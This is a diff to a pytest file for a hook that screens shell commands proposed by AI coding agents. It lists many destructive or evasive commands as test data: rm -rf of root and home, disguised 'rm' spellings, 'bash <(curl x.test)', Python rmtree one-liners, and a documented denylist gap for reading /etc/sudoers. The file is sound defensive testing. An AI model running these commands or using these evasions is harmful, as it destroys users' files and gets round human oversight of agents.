@@ -189,7 +189,7 @@ def test_the_screenshot_reason_text_is_allowed():
 @pytest.mark.parametrize("command", [
     "git status", "rm -rf ./build", "rm -rf /tmp/xyz", f"rm -rf {HOME}/src/x-wt", 'rm -rf "$HOME/src/x-wt"', "rm -f /*.log",
     "rm -rf /usr/local/lib/old", "rm -rf /var/folders/ab/cd", "rm -rf /Users/tester/src/old", "rm file-with-system-in-name",
-    'S=/tmp/x; rm -f $S/a $S/*.log', "diskutil list", "dscl . -read /Users/tester", "security find-identity -v",
+    "diskutil list", "dscl . -read /Users/tester", "security find-identity -v",
     "chmod -R 755 ./dist", "find . -name '*.pyc' -delete", "echo passwd", "cat /etc/passwd", "ls /Volumes",
     "rm -rf /Volumes/Backup/old/2020", "python3 -c 'print(1)'", "sudo-secretspec-docs-are-not-here" if False else "ls docs",
 ])
@@ -760,7 +760,6 @@ CODEX_CARDS = [
     "/bin/zsh -lc 'cd /tmp && rm -rf ~/'",
     "/bin/zsh -lc 'cd /tmp; rm -rf /System'",
     "/bin/zsh -lc 'rm -rf ~/'",
-    "zsh -c 'S=; rm -rf $S/'",
     'bash -c "cd /tmp; rm -rf $HOME/"',
     "bash -c 'a=1\nrm -rf /usr'",
     "bash -c 'true || rm -rf /etc'",
@@ -912,11 +911,12 @@ def test_the_request_cwd_judges_relative_operands():
 
 
 def test_cd_tracking_is_per_command_line_order():
-    assert held("rm -rf *; cd ~").allow                    # the cd comes after the rm; no directory known before it
     assert held("cd ~ && cd src && rm -rf *").allow        # a later cd moves away from the critical directory
+    assert held("cd /tmp/x && rm -rf *").allow
     assert not held("cd src; cd ~; rm -rf *").allow
-    assert held("cd $UNKNOWN && rm -rf *").allow           # unknown directory: not named as critical
     assert not held("(cd ~ ; rm -rf *)").allow
+    assert not held("rm -rf *; cd ~").allow                # round 3: no directory is known before the cd, so `*` is held
+    assert not held("cd $UNKNOWN && rm -rf *").allow       # round 3: a cd to a variable, then a removal
 
 
 def test_xargs_removal_of_unknown_input_is_held():
@@ -1058,3 +1058,233 @@ def test_hook_uses_the_payload_cwd_for_relative_operands(tmp_path):
     assert run_hook(p, tmp_path, write_grant(tmp_path)) is None
     p["cwd"] = HOME + "/src/x"
     assert run_hook(p, tmp_path, write_grant(tmp_path)) == ALLOW
+
+
+# ---------------------------------------------------------------- adversary round 2 (PR 939), fixed in round 3
+# Stance (lead and operator, 2026-11-22): our agents are trusted, so these rules guard against CARELESS commands, not a hostile
+# agent. Fail closed where the parser cannot be sure; do not out-parse the shell; a textual tripwire catches the runner forms.
+
+
+def is_held(command, rule_prefix=("critical-rm:", "unreadable:unparsable:")):
+    d = held(command)
+    return (not d.allow) and d.rule.startswith(rule_prefix)
+
+
+def cwd_req(command, cwd):
+    return rq(name="CodexBash", provider="codex", command=None, inp={"command": command, "cwd": cwd})
+
+
+# item 1 (HIGH): a variable the command line sets is UNKNOWN, not empty
+
+VARIABLE_HOLDS = [
+    "S=/tmp/x; rm -f $S/a $S/*.log", "S=; rm -rf $S/", "S=/ ; rm -rf ${S}", "rm -rf $S/; S=/tmp", "S=/ rm -rf $S",
+    "export S=/; rm -rf $S", "declare S=/; rm -rf $S", "local S=/; rm -rf $S", "readonly S=/; rm -rf $S", "S+=/; rm -rf $S",
+    "for d in /tmp/a /; do rm -rf $d; done", "for d in *; do rm -rf \"$d\"; done", "while read f; do rm -rf \"$f\"; done",
+    "read X; rm -rf \"$X\"", "printf -v D /; rm -rf $D", "mapfile -t L; rm -rf ${L[0]}", "select d in /x /; do rm -rf $d; done",
+    "f() { rm -rf \"$1\"; }; f /", "f() { rm -rf $@; }; f /Users", "function f { rm -rf \"$*\"; }; f ~", "rm -rf $1", "rm -rf ${1}", "rm -rf $0",
+    "rm -rf ${S:-/}", "rm -rf ${S:=/}", "rm -rf ${S-/}", "rm -rf ${S/x/y}", "rm -rf ${!S}", "rm -rf ${#S}", "rm -rf $PWD/*", "rm -rf $OLDPWD",
+    "HOME=/ ; rm -rf $HOME", "bash -c 'D=/; rm -rf $D'", "sh -c 'for d in /; do rm -rf $d; done'",
+    "D=/; find $D -delete", "D=/; echo $D | xargs rm -rf", "D=/; git -C $D clean -fdx", "D=/x; rsync -a --delete /tmp/e/ $D",
+    "D=/; chmod -R 000 $D", "A=/; cd /tmp && rm -rf $A", "env S=/ sh -c 'rm -rf $S'", "F=-rf; rm $F /tmp/x",
+]
+
+
+@pytest.mark.parametrize("command", VARIABLE_HOLDS)
+def test_a_variable_the_line_sets_is_unknown_not_empty(command):
+    d = held(command)
+    assert not d.allow and d.rule.startswith(("critical-rm:", "unreadable:unparsable:")), (command, d.rule)
+
+
+def test_variable_holds_say_why():
+    assert held("S=/tmp/x; rm -f $S/a").rule == "unreadable:unparsable:variable $S in a removal"
+    assert "positional" not in held("rm -rf $1").rule and "$1" in held("rm -rf $1").rule
+    assert "${S:-/}" in held("rm -rf ${S:-/}").rule
+
+
+@pytest.mark.parametrize("command", [
+    SCREENSHOT, "rm -rf $UNSET/x", "rm -f $S/all.done $S/*.log", 'rm -rf "${S:?}"/x', "rm -f /tmp/foo.$$", "rm -rf $HOME/src/x-wt",
+    "rm -rf ${HOME}/src/x", "S=/tmp/x; ls $S", "S=/tmp/x; echo $S; rm -rf ./build", "for f in a b; do echo $f; done",
+    "rm -rf ./a$UNSET", "X=1 make test", "x=$(git rev-parse HEAD); echo $x",
+])
+def test_names_the_line_never_sets_stay_empty_and_other_uses_are_fine(command):
+    d = held(command)
+    assert d.allow, (command, d.rule)
+
+
+# item 2 (MED): a glob or brace at the top of a critical directory
+
+@pytest.mark.parametrize("command", [
+    "rm -rf ~/{*,.*}", "rm -rf ~/?*", "rm -rf ~/[a-z]*", "rm -rf /Users/tester/{.,}*", "rm -rf ~/*.*", "rm -rf /Users/*", "rm -rf /usr/lo*",
+    "rm -rf ~/Lib*", "rm -rf /Us*rs", "rm -rf /*", "rm -rf ~/.*", "rm -rf ~/**", "rm -rf ~/{a,b}", "rm -rf /Users/*/Library", "rm -rf /Volumes/*",
+    "rm -rf /usr/bin/*.sh", "rm -rf /etc/*.conf", "rm -rf /tmp/*", "rm -rf $HOME/{*,.*}", "rm -rf ${HOME}/?*",
+    "find ~/* -delete", "chmod -R 000 ~/[a-z]*", "cd ~ && rm -rf {*,.*}", "cd / && rm -rf ?*", "cd /Users/tester && rm -rf [a-z]*",
+])
+def test_a_glob_or_brace_at_the_top_of_a_critical_directory_is_held(command):
+    assert is_held(command), (command, held(command).rule)
+
+
+@pytest.mark.parametrize("command", [
+    "rm -f /*.log", "rm -f ~/*.log", "rm -f /tmp/*.log", "rm -rf ~/src/*", "rm -rf /tmp/x/{a,b}", "rm -f $S/*.log", "rm -rf ~/src/x-wt/*",
+    "rm -f /Users/tester/*-old.txt", "rm -rf /var/folders/*/x", "rm -rf /Volumes/Backup/old/*",
+])
+def test_narrow_globs_and_globs_below_the_top_stay_allowed(command):
+    assert held(command).allow, (command, held(command).rule)
+
+
+# item 3 (MED): the working directory is unknown for a Paseo Claude request
+
+@pytest.mark.parametrize("command", [
+    "rm -rf .", "rm -rf ..", "rm -rf *", "rm -rf .*", "rm -rf ../x", "rm -rf ../../y", "rm -rf ./*", "rm -rf *.*", "rm -rf ?*", "rm -rf [a-z]*",
+    "rm -rf {a,b}*", "rm -rf ./..", "find . -delete", "find -delete", "find .. -name x -delete", "find * -type f -delete", "chmod -R 000 .",
+    "chmod -R 700 ../x", "git clean -fdx .", "git clean -fdx ..", "rsync -a --delete /tmp/e/ ..", "echo . | xargs rm -rf", "echo .. | xargs rm -rf",
+    "find . | xargs rm -rf", "cd \"$(echo ~)\" && rm -rf build", "cd $X && rm -rf build", "cd $(pwd)/.. && rm -f x", "cd - && rm x", "cd `pwd` && rm -rf x",
+    "cd $UNSET; rm -f ./a", "pushd \"$D\" && rm x", "popd && rm x", "cd \"\" && rm -rf *", "cd ~ && cd \"$1\" && rm -rf build",
+    "git -C \"$(echo ~)\" clean -fdx", "git -C $D clean -fd", "git -C \"$X\" clean -fdx", "git -C .. clean -fdx", "cd $X && git clean -fdx",
+    "echo $(echo ~) | xargs rm -rf", "printf '%s\\n' \"$(echo ~)\" | xargs rm -rf", "find $(echo ~) | xargs rm -rf", "echo `echo ~` | xargs rm",
+])
+def test_relative_removals_with_an_unknown_directory_are_held(command):
+    assert is_held(command), (command, held(command).rule)
+
+
+@pytest.mark.parametrize("command", [
+    "rm -rf ./build", "rm -rf build", "rm -f *.log", "rm -f ./*.pyc", "find . -name '*.pyc' -delete", "find . -type f -name x -exec rm {} +", "rm -rf build/*",
+    "git clean -fdx", "cd /tmp/x && rm -rf *", "git -C ~/src/x clean -fd", "rm -rf a/../b", "git --work-tree=/tmp/x clean -fd",
+    "cd ~/src && cd x && rm -rf *", "cd $HOME/src/x && rm -rf *", "cd src && rm -rf ./out", "chmod -R 755 ./dist", "rm -rf /tmp/a $UNSET",
+    "cd $X && ls", "cd $X && rm -rf /tmp/x",
+])
+def test_relative_removals_that_cannot_reach_the_whole_directory_stay_allowed(command):
+    assert held(command).allow, (command, held(command).rule)
+
+
+def test_a_known_request_directory_still_judges_relative_removals():
+    assert not verdict(cwd_req("rm -rf .", HOME)).allow
+    assert verdict(cwd_req("rm -rf .", HOME + "/src/x")).allow
+    assert verdict(cwd_req("rm -rf *", HOME + "/src/x")).allow
+    assert verdict(cwd_req("find . -delete", HOME + "/src/x")).allow
+    assert not verdict(cwd_req("find . -delete", HOME)).allow
+    assert not verdict(cwd_req("rm -rf ..", HOME + "/src")).allow
+    assert not verdict(cwd_req("cd $X && rm -rf build", HOME + "/src/x")).allow     # a cd to a variable beats the known directory
+
+
+# item 4 (MED): command words and runner forms; the textual tripwire
+
+@pytest.mark.parametrize("command", [
+    "parallel rm ::: x", "ssh host rm -rf x", "ssh host 'rm -rf /'", "fd -X rm", "fd . -x rm {}", "flock /tmp/l rm -rf x", "script -q /dev/null rm -rf x",
+    "echo a | xargs -d '\\n' -n1 sh -c 'rm -rf $0'", "xargs -J % rm %", "echo a | xargs -I{} sh -c 'rm {}'", "find /tmp/x -exec sh -c 'rm -rf /' _ {} \\;",
+    "find /tmp/x -name a -exec env rm {} \\;", "alias ls='rm -rf'", "alias x=rm", "f() { :; }; rm x", "function g { :; }; rm x", "x=1; y() { :; }\nrm -f z",
+    "docker rm x", "aws s3 sync . s3://b --delete", "trash x", "tmux send-keys 'rm -rf /' Enter",
+    "xargs -P4 -n1 -- rm", "time -p parallel rm", "nohup parallel rm", "echo x | parallel rm", "sudo --preserve-env parallel rm x",
+    "env -i parallel rm", "cat list | while read f; do trash $f; done", "ruby -e 'system(\"rm x\")'",
+])
+def test_a_remover_word_the_parser_did_not_judge_holds_the_request(command):
+    assert is_held(command), (command, held(command).rule)
+
+
+@pytest.mark.parametrize("command", [
+    "$'\\x72m' -rf /", "\"rm\" -rf x", "r\\m x", "r''m x", "/bin/r[m] x", "/bin/r? -rf x", "{rm,-rf,x}", "=rm x", "$RM -rf x", "\"$HOME/bin/tool\" a",
+    "sudo $SUDO_CMD", "'git' status", "\\git status", "env $E rm x", "/bin/r*m x", "$(echo rm) x",
+])
+def test_a_command_word_that_is_not_a_plain_word_is_held(command):
+    d = held(command)
+    assert not d.allow and d.rule.startswith(("unreadable:unparsable:", "critical-rm:")), (command, d.rule)
+
+
+def test_non_plain_command_word_reason():
+    assert "not a plain word" in held("r''m x").rule and "not a plain word" in held("$RM x").rule
+
+
+@pytest.mark.parametrize("command", [
+    "echo rm -rf /", "git rm -rf --cached x", "git commit -m 'fix rm -rf handling'", "docker run --rm img", "man rm", "rg 'rm -rf' docs",
+    "grep -n rm file", "cat docs/rm.md", "paseo send x 'rm -rf is held'", "gh pr create --body 'rm -rf is held'", "[ -f x ] && echo yes",
+    "[[ -n x ]] && echo yes", "if [ -d x ]; then ls; fi", "echo hi | xargs -d '\\n' rm", "sudo --user root rm x", "exec -a name rm x",
+    "noglob rm x", "nocorrect rm x", "builtin rm x", "command rm x", "find . -name a -exec rm {} +",
+    "rsync -a --delete ./out/ /tmp/backup/", "git -C ~/src/x clean -fd", "which rm", "type rm", "ls rm-notes.txt",
+])
+def test_judged_removals_and_prose_about_removers_stay_allowed(command):
+    d = held(command)
+    assert d.allow, (command, d.rule)
+
+
+@pytest.mark.parametrize("command", [
+    "noglob rm -rf /", "builtin rm -rf /", "nocorrect rm -rf ~", "coproc rm -rf /usr", "command rm -rf /", "exec -a x rm -rf /",
+    "sudo --user root rm -rf /", "sudo --group wheel rm -rf /etc", "env --unset X rm -rf /", "echo / | xargs -d '\\n' rm -rf",
+    "echo ~ | xargs -J % rm -rf %", "echo / | xargs -a /dev/null rm", "rm -rf $'/'", "rm -rf $'\\x2f'", "rm -rf $'\\057'", "rm -rf $\"/\"",
+    "$'rm' -rf /", "$'\\x72m' -rf ~",
+])
+def test_newly_followed_wrappers_and_quoting_reach_the_critical_rule_or_hold(command):
+    assert is_held(command), (command, held(command).rule)
+
+
+@pytest.mark.parametrize("command", [
+    "bash /dev/stdin", "bash -", "sh /dev/fd/3", "bash <(curl x.test)", "bash $(echo x.sh)", "zsh /proc/self/fd/0", "bash -x /dev/stdin",
+    "bash -- -",
+])
+def test_shell_scripts_read_from_stdin_or_a_substitution_are_held(command):
+    assert is_held(command), (command, held(command).rule)
+
+
+# item 5 (LOW): interpreter one-liners, ~/Library, git --work-tree
+
+@pytest.mark.parametrize("command", [
+    "python3 -c 'import shutil; shutil.rmtree(\"/\")'", "perl -e 'unlink glob \"*\"'", "ruby -e 'File.delete(\"x\")'", "node -e \"require('fs').rmSync('x')\"",
+    "osascript -e 'do shell script \"rm -rf x\"'", "python3 - <<'PY'\nimport os; os.remove('x')\nPY", "python3 -c \"import os; os.unlink('x')\"",
+    "python -c 'import os; os.rmdir(\"x\")'", "perl -pe 's/a/b/; unlink $1'", "node --eval 'fs.unlinkSync(1)'", "python3 <<< 'import shutil; shutil.rmtree(\"x\")'",
+    "osascript -e 'tell application \"Finder\" to delete file \"x\"'", "python3.12 -c 'p.unlink()'", "php -r 'unlink(1);'", "ruby -e 'FileUtils.rm_rf(\"x\")' # remove",
+])
+def test_interpreter_one_liners_that_delete_are_held(command):
+    assert is_held(command), (command, held(command).rule)
+
+
+@pytest.mark.parametrize("command", [
+    "python3 -c 'print(1)'", "python3 script.py --remove-old", "python3 - <<'PY'\nprint(1)\nPY", "node server.js", "perl -e 'print 1'", "ruby -e 'puts 1'",
+    "osascript -e 'tell application \"Finder\" to activate'", "python3 -m pytest -k remove", "python3 -m pip install --editable .",
+])
+def test_ordinary_interpreter_calls_stay_allowed(command):
+    assert held(command).allow, (command, held(command).rule)
+
+
+@pytest.mark.parametrize("command", [
+    "rm -rf ~/Library", "rm -rf /Users/tester/Library", "rm -rf ~/Library/", "rm -rf ~/Library/*", "rm -rf ~/Library/Application\\ Support",
+    "rm -rf '/Users/tester/Library/Application Support'", "rm -rf /Users/someone/Library",
+    "cd ~ && rm -rf Library", "rm -rf $HOME/Library", "rmdir ~/Library", "find ~/Library -delete",
+])
+def test_removing_the_library_folder_itself_is_held(command):
+    assert is_held(command, ("critical-rm:", "denylist:", "unreadable:")), (command, held(command).rule)
+
+
+@pytest.mark.parametrize("command", ["rm -rf ~/Library/Caches/x", "rm -rf ~/Library/Logs/old.log", "rm -f ~/Library/Preferences/x.plist"])
+def test_things_below_the_library_folder_stay_allowed(command):
+    assert held(command).allow, (command, held(command).rule)
+
+
+@pytest.mark.parametrize("command", [
+    "git --work-tree=/Users/tester clean -fdx", "git --work-tree ~ clean -fd", "git --work-tree=/ clean -fd", "git --work-tree=$X clean -fd",
+    "git --work-tree=~/ -C /tmp clean -fdx", "git -C /tmp --work-tree=/usr/local clean -ffd", "git --git-dir=/tmp/x/.git --work-tree=/Users clean -fdx",
+    "git --work-tree=.. clean -fdx",
+])
+def test_git_clean_follows_the_work_tree(command):
+    assert is_held(command), (command, held(command).rule)
+
+
+# LOW 4 stays documented: what the denylist does not see
+
+def test_the_denylist_does_not_see_through_variables_and_globs():
+    # documented in docs/approval-window.md (a note, not a boundary): a tripwire string assembled by the shell is not read
+    assert held("cat /etc/sudo*").allow
+    assert held("a=sudo; b=ers; cat /etc/$a$b").allow
+
+
+def test_ansi_c_decoder():
+    assert W._ansi_c("\\x72m") == "rm" and W._ansi_c("\\057") == "/" and W._ansi_c("a\\nb") == "a\nb" and W._ansi_c("\\u0041") == "A"
+    assert W._ansi_c("\\q") == "\\q" and W._ansi_c("x\\") == "x\\"
+
+
+@pytest.mark.parametrize("command", ["A=rm", "A='rm -rf /tmp/x'", "F=rm; echo done", "export R=rm"])
+def test_an_assignment_that_stores_a_remover_word_is_held(command):
+    assert is_held(command), (command, held(command).rule)
+
+
+def test_the_library_folder_is_judged_for_any_home():
+    d = W.decide(rq(command="rm -rf ~/Library"), "/srv/tester")
+    assert not d.allow and d.rule.startswith("critical-rm:")
+    assert W.decide(rq(command="rm -rf ~/Library/Caches/x"), "/srv/tester").allow
